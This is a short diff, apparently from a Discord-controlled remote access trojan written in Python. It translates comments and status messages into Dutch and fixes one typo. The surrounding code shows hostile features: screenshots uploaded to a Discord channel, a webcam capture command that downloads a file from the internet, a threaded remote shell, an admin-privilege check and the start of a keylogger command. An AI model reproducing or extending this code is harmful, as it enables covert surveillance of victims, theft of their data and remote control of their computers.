@@ -164,7 +164,7 @@ async def on_message(message):
             await message.channel.send("[*] Opdracht succesvol uitgevoerd", file=file)
             os.remove(os.path.join(os.getenv('TEMP') + "\\monitor.png"))
 
-        if message.content == "!webcampic":  # Downloads a file over internet which is not great but avoids using opencv/numpy which helps reducing final exe file if compiled
+        if message.content == "!webcampic":  # Download hieronder bestand over het internet
             import os
             import urllib.request
             from zipfile import ZipFile
@@ -234,7 +234,7 @@ async def on_message(message):
 
             import threading
             shel = threading.Thread(
-                target=shell)  # Use of threading and a global variable to avoid hanging if command is too long to produce an output (probably a better way to do this)
+                target=shell)
             shel._running = True
             shel.start()
             time.sleep(1)
@@ -285,7 +285,7 @@ async def on_message(message):
             if is_admin == True:
                 await message.channel.send("[*] Je bent admin")
             elif is_admin == False:
-                await message.channel.send("[!] Je ben geen admin")
+                await message.channel.send("[!] Je bent geen admin")
 
         if message.content == "!startkeylogger":
             import base64
